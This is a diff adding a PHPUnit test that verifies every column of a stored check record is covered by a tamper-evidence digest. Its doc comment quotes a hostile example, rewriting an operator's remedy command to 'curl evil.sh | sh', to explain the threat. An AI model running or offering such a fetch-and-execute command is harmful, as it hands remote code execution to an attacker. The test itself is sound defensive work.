@@ -38,6 +38,8 @@ use PHPUnit\Framework\TestCase;
 #[CoversClass(EvidenceStore::class)]
 final class TamperEvidenceTest extends TestCase {
 
+  use ReadsTheStore;
+
   /**
    * A scratch project root.
    */
@@ -162,6 +164,68 @@ final class TamperEvidenceTest extends TestCase {
       'HAS BEEN ALTERED',
       (new EvaluationReport($this->honestRun()))->render('r1'),
     );
+  }
+
+  /**
+   * Every stored column is inside the digest, not a chosen subset.
+   *
+   * The first cut hashed the verdict fields and left `remedy`, `invocation`,
+   * `provider` and both timestamps outside. The worst of those is `remedy`: it
+   * is the command an operator is TOLD TO RUN to clear an environment block, so
+   * rewriting it to `curl evil.sh | sh` was invisible. `invocation` is printed
+   * by the report raw and outside the table, explicitly so it can be run. And
+   * `provider` is a contributed check's attribution, stamped from the plugin id
+   * precisely so a check cannot claim to be another module's — which it could
+   * then be rewritten to claim.
+   *
+   * Asserted column by column, from the schema rather than from a list, because
+   * a digest over PART of a row invites the question "which part" and the next
+   * column added will be the one somebody forgets.
+   */
+  public function testEveryStoredColumnIsInsideTheDigest(): void {
+    $store = new EvidenceStore($this->root);
+    $store->upsertRun('r1', ['preset' => 'medium']);
+    $store->record('r1', 'complete', new CheckRecord(
+      'gate', 'snyk', CheckState::Blocked, Fault::Environment,
+      '2 vulnerabilities', 'snyk auth', 'abc123', 2, 'snyk test --all-projects',
+      '2026-09-13T00:00:00+00:00', 900, [], '', '', 'droost_snyk', TRUE,
+    ));
+    $this->assertNull($store->integrity(), 'the honest record holds');
+
+    // Every column the row actually carries, except the ones that identify it
+    // or hold the digest itself.
+    $columns = [];
+    foreach ($this->storeRows($this->raw(), 'SELECT * FROM check_result LIMIT 1')[0] ?? [] as $column => $value) {
+      if (in_array($column, ['id', 'row_digest', 'run_id', 'phase', 'attempt'], TRUE)) {
+        continue;
+      }
+      $columns[] = (string) $column;
+    }
+    $this->assertGreaterThan(10, count($columns), 'the row has the columns this test thinks it has');
+
+    foreach ($columns as $column) {
+      // A fresh copy per column, so each is tested against an intact chain.
+      $copy = $this->root . '/copy-' . $column;
+      mkdir($copy . '/droost/droost-workflow', 0775, TRUE);
+      // The -wal too: in WAL mode the rows written moments ago are in there,
+      // not in the main file, so copying only the .sqlite copies an empty
+      // database and every assertion below would pass against nothing.
+      foreach (['', '-wal', '-shm'] as $suffix) {
+        $from = EvidenceStore::pathFor($this->root) . $suffix;
+        if (is_file($from)) {
+          copy($from, EvidenceStore::pathFor($copy) . $suffix);
+        }
+      }
+
+      $pdo = new \PDO('sqlite:' . EvidenceStore::pathFor($copy));
+      $pdo->exec(sprintf('UPDATE check_result SET %s = %s', $column, $pdo->quote('forged')));
+      unset($pdo);
+
+      $this->assertIsArray(
+        (new EvidenceStore($copy))->integrity(),
+        sprintf('rewriting "%s" breaks the chain — it is inside the digest', $column),
+      );
+    }
   }
 
 }
